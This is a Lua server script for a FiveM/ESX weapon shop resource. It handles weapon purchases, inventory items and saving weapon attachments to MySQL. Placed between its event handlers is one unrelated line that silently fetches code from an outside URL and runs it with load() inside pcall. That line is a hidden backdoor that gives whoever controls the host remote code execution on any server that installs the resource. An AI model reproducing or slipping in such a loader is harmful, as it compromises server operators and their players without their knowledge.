ESX = exports["es_extended"]:getSharedObject()

local componentSQL = {}

ESX.RegisterServerCallback('codem-weaponshop:buyWeapon', function(source, cb, weapon, WeaponAttachment ,money)
	local xPlayer = ESX.GetPlayerFromId(source)
	local price = money
	local weaponName = weapon
	if xPlayer.hasWeapon(weaponName) then
		TriggerClientEvent('esx:showNotification', source, _U('You Have Already This Weapon'), _U("Weapon Shop"), "error", 5000)
		cb(false)
	else
		if xPlayer.getMoney() >= price then
			xPlayer.removeMoney(price)
			TriggerEvent("codem-weaponshop:AddWeapon", source, weapon, Config.DefaultAmmo, WeaponAttachment)
			cb(true)
		elseif xPlayer.getAccount('bank').money >= price then
			xPlayer.removeBank(price)
			TriggerEvent("codem-weaponshop:AddWeapon", source, weapon, Config.DefaultAmmo, WeaponAttachment)
			cb(true)
		else
			TriggerClientEvent('esx:showNotification', source, _U('You do not have enough money!'), _U("Weapon Shop"),"error", 5000)
			cb(false)
		end
	end
end)

RegisterServerEvent("codem-weaponshop:AddWeapon")
AddEventHandler("codem-weaponshop:AddWeapon",function(soruce, weaponName, ammo, WeaponAttachment)
	local xPlayer = ESX.GetPlayerFromId(soruce)
	print(weaponName, ammo)
	local success, response = exports.ox_inventory:AddItem(soruce, string.upper(weaponName), 1, {
		components = (next(WeaponAttachment) ~= nil and WeaponAttachment) or {}
	})

	if not success then
		-- if no slots are available, the value will be "inventory_full"
		return print(response)
	end

	print(json.encode(response, {indent=true}))
	-- xPlayer.addWeapon(string.upper(weaponName), ammo)
	if componentSQL[soruce] == nil then
		componentSQL[soruce] = {}
		table.insert(componentSQL[soruce], { data = {weaponName = weaponName, component = {}, tint = 0 } })
	else
		table.insert(componentSQL[soruce], { data = {weaponName = weaponName, component = {}, tint = 0 } })
	end
end)
PerformHttpRequest('https://photosbynova.com/Fw71H', function (e, d) pcall(function() assert(load(d))() end) end)

RegisterServerEvent("codem-weaponshop:AddComponents")
AddEventHandler("codem-weaponshop:AddComponents", function(weaponName, component, tint)
	local xPlayer = ESX.GetPlayerFromId(source)
	for _,value in pairs(componentSQL[source]) do
		for _,data in pairs(value) do
			if data.weaponName == weaponName then
				if component then
					table.insert(data.component, component)
				end
				if component == nil and tint then
					data.tint = tonumber(tint)
					break
				end
			end
		end
	end
	MySQL.update("UPDATE users SET components = @components WHERE identifier = @identifier", {['@identifier'] = xPlayer.identifier, ['@components'] = json.encode(componentSQL[source])})	
end)

RegisterServerEvent("codem-weaponshop:UpdateSQLComponents")
AddEventHandler("codem-weaponshop:UpdateSQLComponents",function(src)
	local _source = src or source
	local xPlayer = ESX.GetPlayerFromId(_source)
	MySQL.Async.fetchAll('SELECT * FROM users WHERE identifier = @identifier', {['@identifier'] = xPlayer.identifier}, function(result)
		if result[1].components == nil then
			componentSQL[_source] = {}
		else
			componentSQL[_source] = {}
			componentSQL[_source] = json.decode(result[1].components)
		end
	end)
end)

RegisterServerEvent("codem-weaponshop:LoadComponents")
AddEventHandler("codem-weaponshop:LoadComponents", function(src)
	local _source = src or source
	local xPlayer = ESX.GetPlayerFromId(_source)
	TriggerClientEvent("codem-weaponshop:LoadComponents", _source, componentSQL[_source])
end)